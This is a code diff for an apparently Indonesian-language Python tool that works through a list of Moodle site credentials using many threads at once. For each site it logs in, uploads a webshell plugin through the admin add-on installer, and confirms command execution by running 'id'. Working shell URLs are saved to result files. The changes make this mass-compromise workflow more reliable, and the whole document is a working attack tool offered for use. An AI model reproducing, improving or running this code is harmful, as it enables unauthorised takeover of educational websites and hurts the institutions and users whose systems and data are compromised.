@@ -1,9 +1,8 @@
-
 import requests
 import re
 import os
 import argparse
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse
 from concurrent.futures import ThreadPoolExecutor
 
 requests.packages.urllib3.disable_warnings()
@@ -15,7 +14,7 @@ def save_result(filename, text):
 
 def get_login_token(session, url):
     try:
-        r = session.get(url, timeout=15, verify=False)
+        r = session.get(url, timeout=15, verify=False, allow_redirects=True)
         token = re.findall(r'name="logintoken" value="(.*?)"', r.text)
         return token[0] if token else None
     except:
@@ -24,16 +23,15 @@ def get_login_token(session, url):
 def check_plugins_page(session, base_url):
     try:
         plugins_url = urljoin(base_url, "/admin/plugins.php")
-        r = session.get(plugins_url, timeout=15, verify=False)
-        return "plugin" in r.text.lower()
+        r = session.get(plugins_url, timeout=15, verify=False, allow_redirects=True)
+        return "plugin" in r.text.lower() and "moodle" in r.text.lower()
     except:
         return False
 
 def check_webshell(session, base_url):
     try:
-        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php")
-        check_url = f"{shell_url}?action=exec&cmd=id"
-        r = session.get(check_url, timeout=15, verify=False)
+        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
+        r = session.get(shell_url, timeout=15, verify=False, allow_redirects=True)
         return "uid=" in r.text
     except:
         return False
@@ -54,12 +52,14 @@ def process(line):
         }
 
         base_url = url.split("/login")[0]
-        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=False)
+        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=True)
 
-        if login.status_code == 303 and "MOODLEID1_=deleted" in login.headers.get("Set-Cookie", ""):
+        if login.url.endswith("/my/") or login.status_code in [200, 303]:
             save_result("login_success.txt", line)
+
+            # STEP: Upload plugin
             install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
-            r = session.get(install_url, timeout=15, verify=False)
+            r = session.get(install_url, timeout=15, verify=False, allow_redirects=True)
             sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
             if not sesskey:
                 return
@@ -81,17 +81,24 @@ def process(line):
                 files=files,
                 data=data,
                 verify=False,
-                timeout=20
+                timeout=20,
+                allow_redirects=True
             )
 
             if "url" in upload.text:
                 save_result("upload_success.txt", line)
+
+                # Cek plugin halaman
                 if check_plugins_page(session, base_url):
                     save_result("upload_success_checked.txt", f"{url}|{username}|{password}")
+
+                    # Cek shell aktif
                     if check_webshell(session, base_url):
-                        save_result("webshell_live.txt", f"{url}/local/moodle_webshell/webshell.php")
-    except:
-        pass
+                        shell_link = urljoin(base_url, "/local/moodle_webshell/webshell.php")
+                        save_result("webshell_live.txt", shell_link)
+
+    except Exception as e:
+        pass  # Bisa tambahkan logging di sini kalau mau debug
 
 def main():
     parser = argparse.ArgumentParser()
@@ -105,7 +112,7 @@ def main():
     with ThreadPoolExecutor(max_workers=args.thread) as exe:
         exe.map(process, lines)
 
-    print("\nUPLOAD DONE. Cek folder 'result' untuk hasil berikut:")
+    print("\n✅ UPLOAD DONE. Cek folder 'result' untuk hasil:")
     print("- login_success.txt")
     print("- upload_success.txt")
     print("- upload_success_checked.txt")
